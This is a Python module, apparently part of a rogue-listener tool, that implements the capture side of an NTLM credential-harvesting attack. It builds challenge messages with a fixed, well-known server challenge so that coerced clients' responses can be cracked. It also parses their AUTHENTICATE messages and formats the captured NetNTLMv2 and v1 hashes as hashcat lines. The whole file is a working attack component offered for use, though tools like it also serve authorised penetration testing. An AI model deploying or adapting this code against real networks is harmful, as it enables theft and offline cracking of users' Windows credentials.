"""
NTLM / NetNTLM message handling (MS-NLMP).

Enough of the NTLM authentication protocol to run the capture side of a rogue
listener: build the Type-2 CHALLENGE we hand a coerced client, parse the Type-3
AUTHENTICATE it sends back, and format the captured NetNTLMv2 response as a
hashcat-crackable line (mode 5600). Nothing here connects to a network — it is
pure byte manipulation, which is exactly what makes it testable.

We use the well-known static server challenge 1122334455667788 so captured hashes
can be cracked offline against standard tooling.
"""

from __future__ import annotations

import struct
from typing import Dict

NTLMSSP_SIGNATURE = b"NTLMSSP\x00"
DEFAULT_CHALLENGE = bytes.fromhex("1122334455667788")

# NegotiateFlags advertised in our Type-2: Unicode, NTLM, Target Info, Target Type
# Server, Always Sign, plus request Target — enough for clients to send NTLMv2.
_TYPE2_FLAGS = 0xE2898215


def message_type(msg: bytes) -> int:
    """The NTLM message type (1, 2 or 3), or -1 if this isn't an NTLM message."""
    if len(msg) < 12 or not msg.startswith(NTLMSSP_SIGNATURE):
        return -1
    return struct.unpack_from("<I", msg, 8)[0]


def _field(length: int, offset: int) -> bytes:
    """An 8-byte NTLM field descriptor: Len, MaxLen, BufferOffset."""
    return struct.pack("<HHI", length, length, offset)


def _av_pair(av_id: int, value: bytes) -> bytes:
    return struct.pack("<HH", av_id, len(value)) + value


def _target_info(domain: str) -> bytes:
    d = domain.encode("utf-16-le")
    return (
        _av_pair(2, d)      # MsvAvNbDomainName
        + _av_pair(1, d)    # MsvAvNbComputerName
        + _av_pair(0, b"")  # MsvAvEOL
    )


def build_type2(challenge: bytes = DEFAULT_CHALLENGE, target_name: str = "WORKGROUP") -> bytes:
    """Construct a Type-2 CHALLENGE_MESSAGE offering `challenge` as the server challenge."""
    if len(challenge) != 8:
        raise ValueError("server challenge must be 8 bytes")
    tn = target_name.encode("utf-16-le")
    ti = _target_info(target_name)

    # Fixed header is 56 bytes (48 + the 8-byte Version field, present because our
    # NegotiateFlags set NTLMSSP_NEGOTIATE_VERSION — consistent with build_type3);
    # payload (target name, then target info) follows.
    header_len = 56
    tn_offset = header_len
    ti_offset = tn_offset + len(tn)

    header = (
        NTLMSSP_SIGNATURE
        + struct.pack("<I", 2)                      # MessageType = 2
        + _field(len(tn), tn_offset)                # TargetNameFields
        + struct.pack("<I", _TYPE2_FLAGS)           # NegotiateFlags
        + challenge                                 # ServerChallenge (8)
        + b"\x00" * 8                               # Reserved
        + _field(len(ti), ti_offset)                # TargetInfoFields
        + b"\x00" * 8                               # Version (NEGOTIATE_VERSION is set)
    )
    assert len(header) == header_len, len(header)
    return header + tn + ti


# --- Type 3 (AUTHENTICATE) ---------------------------------------------------
# Fixed header (with Version + MIC) is 88 bytes; payload begins there.
_T3_HEADER_LEN = 88


def build_type3(
    *,
    user: str,
    domain: str,
    workstation: str,
    nt_response: bytes,
    lm_response: bytes = b"\x00" * 24,
) -> bytes:
    """Construct a Type-3 AUTHENTICATE_MESSAGE (used by tests and self-checks)."""
    d = domain.encode("utf-16-le")
    u = user.encode("utf-16-le")
    w = workstation.encode("utf-16-le")

    # Payload order: LM, NT, Domain, User, Workstation, SessionKey.
    off = _T3_HEADER_LEN
    lm_off = off; off += len(lm_response)
    nt_off = off; off += len(nt_response)
    dom_off = off; off += len(d)
    usr_off = off; off += len(u)
    ws_off = off; off += len(w)
    sk_off = off  # empty session key

    header = (
        NTLMSSP_SIGNATURE
        + struct.pack("<I", 3)                          # MessageType = 3
        + _field(len(lm_response), lm_off)              # LmChallengeResponse
        + _field(len(nt_response), nt_off)              # NtChallengeResponse
        + _field(len(d), dom_off)                       # DomainName
        + _field(len(u), usr_off)                       # UserName
        + _field(len(w), ws_off)                        # Workstation
        + _field(0, sk_off)                             # EncryptedRandomSessionKey
        + struct.pack("<I", _TYPE2_FLAGS)               # NegotiateFlags
        + b"\x00" * 8                                   # Version
        + b"\x00" * 16                                  # MIC
    )
    assert len(header) == _T3_HEADER_LEN, len(header)
    return header + lm_response + nt_response + d + u + w


def _read_field(msg: bytes, pos: int) -> bytes:
    length, _maxlen, offset = struct.unpack_from("<HHI", msg, pos)
    if length == 0:
        return b""
    if offset + length > len(msg):
        raise ValueError("NTLM field points outside the message")
    return msg[offset:offset + length]


def parse_type3(msg: bytes) -> Dict:
    """Extract username, domain, workstation and responses from a Type-3 message."""
    if message_type(msg) != 3:
        raise ValueError("not an NTLM Type-3 (AUTHENTICATE) message")
    lm_response = _read_field(msg, 12)
    nt_response = _read_field(msg, 20)
    domain = _read_field(msg, 28).decode("utf-16-le", "replace")
    user = _read_field(msg, 36).decode("utf-16-le", "replace")
    workstation = _read_field(msg, 44).decode("utf-16-le", "replace")
    return {
        "user": user,
        "domain": domain,
        "workstation": workstation,
        "lm_response": lm_response,
        "nt_response": nt_response,
        # NTLMv2 responses carry NTProofStr(16) + a variable blob, so they exceed 24
        # bytes; NTLMv1 responses are exactly 24.
        "is_v2": len(nt_response) > 24,
    }


def extract_netntlmv2(parsed: Dict, server_challenge: bytes) -> str:
    """Format a parsed NTLMv2 response as a hashcat mode-5600 line."""
    nt = parsed["nt_response"]
    if len(nt) <= 24:
        raise ValueError("response is not NTLMv2")
    ntproof, blob = nt[:16], nt[16:]
    return (
        f"{parsed['user']}::{parsed['domain']}:"
        f"{server_challenge.hex()}:{ntproof.hex()}:{blob.hex()}"
    )


def extract_netntlmv1(parsed: Dict, server_challenge: bytes) -> str:
    """Format a parsed NTLMv1 response as a hashcat mode-5500 line."""
    return (
        f"{parsed['user']}::{parsed['domain']}:"
        f"{parsed['lm_response'].hex()}:{parsed['nt_response'].hex()}:"
        f"{server_challenge.hex()}"
    )
